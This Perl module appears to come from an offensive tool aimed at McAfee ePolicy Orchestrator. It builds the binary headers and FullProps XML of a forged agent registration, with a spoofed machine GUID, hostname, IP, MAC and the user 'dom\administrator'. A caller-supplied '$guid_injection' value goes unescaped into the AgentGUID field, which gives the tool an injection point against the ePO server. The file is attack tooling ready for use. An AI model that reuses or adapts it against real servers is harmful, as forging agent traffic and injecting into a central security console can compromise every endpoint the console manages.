package Epowner::Epo;

use Crypt::OpenSSL::DSA;
use MIME::Base64;
use Digest::SHA qw(sha1 sha1_hex);

use strict;
use warnings;



#============================================================#
# FULL PROPS reauest : Header1                               #
#============================================================#
sub build_struct_fullprops_header1{

	my $this = shift;

        print "      [+] Building binary header 1\n" if $this->{verbose};

        $this->{binary_header1} =
                "\x50\x4f" .
                # packet type
                "\x01\x00\x00\x60" .
                # header len (binary_header1 + binary_header2)
                "WWWW" .
                "\x01\x00\x00\x00\x00\x00\x00\x00" .
                # data_len
                "ZZZZ" .
                # GUID
                $this->{agent_guid} .
                # unknown
                "\x00\x00\x00\x00" .
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" .
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" .
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" .
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" .
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" .
                "\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00" .
                # hostname
                $this->{agent_hostname} .
                # hostname padding
                "\x00" x (32 - length($this->{agent_hostname})) .
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" .
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" .
                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" ;

} 


#============================================================#
# FULL PROPS reauest : Header2                               #
#============================================================#
sub build_struct_fullprops_header2{

	my $this = shift;

        print "      [+] Building binary header 2\n" if $this->{verbose};

	# Generate transaction ID
        my $transaction_guid = generate_guid();

	# increment Sequence number
	$this->{agent_seqnum}++;
	
	# save the new seqnum
	$this->config_save_seqnum_only();


	# build
        $this->{binary_header2} =
                "\x0e\x00\x00\x00" . "AssignmentList" .         pack("V", length("P={4;6;8;a} T={1;2}")) . "P={4;6;8;a} T={1;2}" .
                "\x0c\x00\x00\x00" . "ComputerName" .           pack("V", length($this->{agent_hostname})) . $this->{agent_hostname} .
                "\x12\x00\x00\x00" . "EventFilterVersion" .     pack("V", length("3001")) . "3001"  .
                "\x19\x00\x00\x00" . "GuidRegenerationSupported" . pack("V", length("1")) . "1" .
                "\x09\x00\x00\x00" . "IPAddress" .              pack("V", length($this->{agent_ip})) . $this->{agent_ip} .
                "\x0a\x00\x00\x00" . "NETAddress" .             pack("V", length($this->{agent_mac})) . $this->{agent_mac} .
                "\x0b\x00\x00\x00" . "PackageType" .            pack("V", length("FullProps")) ."FullProps" .
                "\x0a\x00\x00\x00" . "PlatformID" .             pack("V", length("WXPW:5:1:3")) . "WXPW:5:1:3".
                "\x0d\x00\x00\x00" . "PolicyVersion" .          pack("V", length("20401119214747")) . "20401119214747".
                "\x0c\x00\x00\x00" . "PropsVersion" .           pack("V", length("20401119214747")) ."20401119214747" .
                "\x12\x00\x00\x00" . "RepoKeyHashVersion" .     pack("V", length("20401119214747")) . "20401119214747" .
                "\x0e\x00\x00\x00" . "SequenceNumber" .         pack("V", length($this->{agent_seqnum})) . $this->{agent_seqnum} .
                "\x0d\x00\x00\x00" . "ServerKeyHash" .          pack("V", length($this->{server_pubkeyhash})) .$this->{server_pubkeyhash} .
                "\x0f\x00\x00\x00" . "SiteinfoVersion" .        pack("V", length("10")) . "10" .
                "\x15\x00\x00\x00" . "SupportedSPIPEVersion" .  pack("V", length("3.0;4.0;5.0;6.0")) . "3.0;4.0;5.0;6.0".
                "\x0b\x00\x00\x00" . "TaskVersion" .            pack("V", length("1")) . "1".
                "\x0f\x00\x00\x00" . "TransactionGUID" .        pack("V", length($transaction_guid)) . $transaction_guid .
                "\x05\x00\x00\x00" . "User1" .                  pack("V", length("dom\\administrator,0")) . "dom\\administrator,0" .
                "\x13\x00\x00\x00" . "UserAssignmentCount" .    pack("V", length("1")) . "1";


}



#============================================================#
# FULL PROPS : FullProps XML                                 #
#============================================================#
sub build_struct_fullprops_props {

	my $this = shift;
	my $guid_injection = shift;

        print "      [+] Building FullProps XML content\n" if $this->{verbose};

        $this->{props_xml} = << "EOF";
<?xml version="1.0" encoding="UTF-8"?>
        <ns:naiProperties xmlns:ns="naiProps" FullProps="true" PropsVersion="20121205220938" MachineID="$this->{agent_guid}" MachineName="$this->{agent_hostname}">
        <ComputerProperties>
                <CPUSerialNumber>N/A</CPUSerialNumber>
                <CPUSpeed>1599</CPUSpeed>
                <CPUType>Intel(R) Atom(TM) CPU  330   @ 1.60GHz</CPUType>
                <ComputerDescription>N/A</ComputerDescription>
                <ComputerName>$this->{agent_hostname}</ComputerName>
                <DefaultLangID>0409</DefaultLangID>
                <DomainName>WORKGROUP</DomainName>
                <EmailAddress>WXPW</EmailAddress>
                <FreeDiskSpace>13098,00</FreeDiskSpace>
                <FreeMemory>345198592</FreeMemory>
                <Free_Space_of_Drive_C>13098,00</Free_Space_of_Drive_C>
                <IPAddress>$this->{agent_ip}</IPAddress>
                <IPHostName>$this->{agent_hostname}</IPHostName>
                <IPXAddress>N/A</IPXAddress>
                <IsPortable>0</IsPortable>
                <LastUpdate>12/05/2012 23:09:35</LastUpdate>
                <NETAddress>$this->{agent_mac}</NETAddress>
                <NumOfCPU>1</NumOfCPU>
                <NumOfHardDrives>1</NumOfHardDrives>
                <OSBitMode>0</OSBitMode>
                <OSBuildNum>2600</OSBuildNum>
                <OSCsdVersion>Service Pack 3</OSCsdVersion>
                <OSOEMId></OSOEMId>
                <OSPlatform>Professional</OSPlatform>
                <OSType>Windows XP</OSType>
                <OSVersion>5.1</OSVersion>
                <PlatformID>WXPW:5:1:3</PlatformID>
                <SubnetAddress>$this->{agent_subnet}</SubnetAddress>
                <SubnetMask>$this->{agent_netmask}</SubnetMask>
                <TimeZone>Romance Standard Time</TimeZone>
                <TotalDiskSpace>15351,00</TotalDiskSpace>
                <TotalPhysicalMemory>527941632</TotalPhysicalMemory>
                <Total_Space_of_Drive_C>15351,00</Total_Space_of_Drive_C>
                <UserName>user</UserName>
        </ComputerProperties>
        <ProductProperties SoftwareID="EPOAGENT3000" delete="false">
                <Section name="General">
                        <Setting name="AgentBroadcastPingPort">8082</Setting>
                        <Setting name="AgentGUID"><![CDATA[$guid_injection]]></Setting>
                        <Setting name="AgentPingPort">9081</Setting>
                        <Setting name="CheckNetworkMessageInterval">60</Setting>
                        <Setting name="Language">0409</Setting>
                        <Setting name="PluginVersion">4.5.0.1810</Setting>
                        <Setting name="PolicyEnforcementInterval">5</Setting>
                        <Setting name="RebootTimeOut">-1</Setting>
                        <Setting name="ServerKeyHash">$this->{server_pubkeyhash}</Setting>
                        <Setting name="ShowAgentUI">1</Setting>
                        <Setting name="ShowRebootUI">1</Setting>
                        <Setting name="VirtualDirectory"></Setting>
                        <Setting name="bEnableAgentPing">1</Setting>
                        <Setting name="bEnableSuperAgent">0</Setting>
                        <Setting name="bEnableSuperAgentRepository">0</Setting>
                        <Setting name="szInstallDir">C:\\Program Files\\McAfee\\Common Framework</Setting>
                        <Setting name="szProductVer">4.5.0.1810</Setting>
                </Section>
        </ProductProperties>
        <ProductProperties SoftwareID="PCR_____1000" delete="false">
                <Section name="General">
                        <Setting name="Language">0000</Setting>
                        <Setting name="PluginVersion">4.5.0.1810</Setting>
                        <Setting name="szInstallDir">C:\\Program Files\\McAfee\\Common Framework</Setting>
                </Section>
        </ProductProperties>
        </ns:naiProperties>
EOF

        print "      [+] Packing XML\n" if $this->{verbose};
        $this->{props_xml} =
                "\x01\x00\x09\x00" .            # tag ?
                "Props.xml" .
                pack("V",length($this->{props_xml})) .  # len of XML
                $this->{props_xml};

} 



1;
